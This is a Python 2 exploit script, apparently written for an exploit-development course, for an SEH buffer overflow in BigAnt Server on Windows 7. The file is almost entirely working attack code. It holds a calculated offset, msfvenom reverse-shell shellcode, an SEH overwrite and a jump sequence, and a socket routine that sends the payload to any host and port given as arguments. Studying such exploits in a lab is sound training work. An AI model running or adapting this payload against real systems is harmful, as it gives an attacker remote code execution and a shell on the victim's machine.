#!/usr/bin/env python2

# Sample Exploit with SEH on BigAnt Server
# MUtuated from the slides and adapted for Windows 7
# Windows developer image WIN7IE8 from MIcrosoft

import socket
import sys
import logging

# Offset calculated with mona pattern_create and mona pattern_offset
offset=962

# Sequence of characters to find bad characters
bad_chars="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 exitfunc=thread -f python  -b '\x00\x0d\x0a\x25\x20' -v shellcode
shellcode =  b""
shellcode += b"\xda\xd9\xd9\x74\x24\xf4\xba\x49\xa2\x2e\x01"
shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc"
shellcode += b"\x03\x1f\xb1\xcc\xf4\x63\x5d\x92\xf7\x9b\x9e"
shellcode += b"\xf3\x7e\x7e\xaf\x33\xe4\x0b\x80\x83\x6e\x59"
shellcode += b"\x2d\x6f\x22\x49\xa6\x1d\xeb\x7e\x0f\xab\xcd"
shellcode += b"\xb1\x90\x80\x2e\xd0\x12\xdb\x62\x32\x2a\x14"
shellcode += b"\x77\x33\x6b\x49\x7a\x61\x24\x05\x29\x95\x41"
shellcode += b"\x53\xf2\x1e\x19\x75\x72\xc3\xea\x74\x53\x52"
shellcode += b"\x60\x2f\x73\x55\xa5\x5b\x3a\x4d\xaa\x66\xf4"
shellcode += b"\xe6\x18\x1c\x07\x2e\x51\xdd\xa4\x0f\x5d\x2c"
shellcode += b"\xb4\x48\x5a\xcf\xc3\xa0\x98\x72\xd4\x77\xe2"
shellcode += b"\xa8\x51\x63\x44\x3a\xc1\x4f\x74\xef\x94\x04"
shellcode += b"\x7a\x44\xd2\x42\x9f\x5b\x37\xf9\x9b\xd0\xb6"
shellcode += b"\x2d\x2a\xa2\x9c\xe9\x76\x70\xbc\xa8\xd2\xd7"
shellcode += b"\xc1\xaa\xbc\x88\x67\xa1\x51\xdc\x15\xe8\x3d"
shellcode += b"\x11\x14\x12\xbe\x3d\x2f\x61\x8c\xe2\x9b\xed"
shellcode += b"\xbc\x6b\x02\xea\xc3\x41\xf2\x64\x3a\x6a\x03"
shellcode += b"\xad\xf9\x3e\x53\xc5\x28\x3f\x38\x15\xd4\xea"
shellcode += b"\xef\x45\x7a\x45\x50\x35\x3a\x35\x38\x5f\xb5"
shellcode += b"\x6a\x58\x60\x1f\x03\xf3\x9b\xc8\x53\x04\xa3"
shellcode += b"\x09\xc4\x06\xa3\x18\x48\x8e\x45\x70\x60\xc6"
shellcode += b"\xde\xed\x19\x43\x94\x8c\xe6\x59\xd1\x8f\x6d"
shellcode += b"\x6e\x26\x41\x86\x1b\x34\x36\x66\x56\x66\x91"
shellcode += b"\x79\x4c\x0e\x7d\xeb\x0b\xce\x08\x10\x84\x99"
shellcode += b"\x5d\xe6\xdd\x4f\x70\x51\x74\x6d\x89\x07\xbf"
shellcode += b"\x35\x56\xf4\x3e\xb4\x1b\x40\x65\xa6\xe5\x49"
shellcode += b"\x21\x92\xb9\x1f\xff\x4c\x7c\xf6\xb1\x26\xd6"
shellcode += b"\xa5\x1b\xae\xaf\x85\x9b\xa8\xaf\xc3\x6d\x54"
shellcode += b"\x01\xba\x2b\x6b\xae\x2a\xbc\x14\xd2\xca\x43"
shellcode += b"\xcf\x56\xea\xa1\xc5\xa2\x83\x7f\x8c\x0e\xce"
shellcode += b"\x7f\x7b\x4c\xf7\x03\x89\x2d\x0c\x1b\xf8\x28"
shellcode += b"\x48\x9b\x11\x41\xc1\x4e\x15\xf6\xe2\x5a"

# Now Building the payload
buf = "USV "

# Fill the buffer with junk until reaching the overflow
buf +="A"*offset
# SEH exploit
buf += "\xeb\x06\x90\x90"
buf += "\x6a\x8c\x9c\x0f"
buf += "\x90"*20
buf += shellcode
buf += "B" *(2500-len(buf))

# Finally linefeed to send the buffer
buf += '\r\n'
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

s.send(buf)
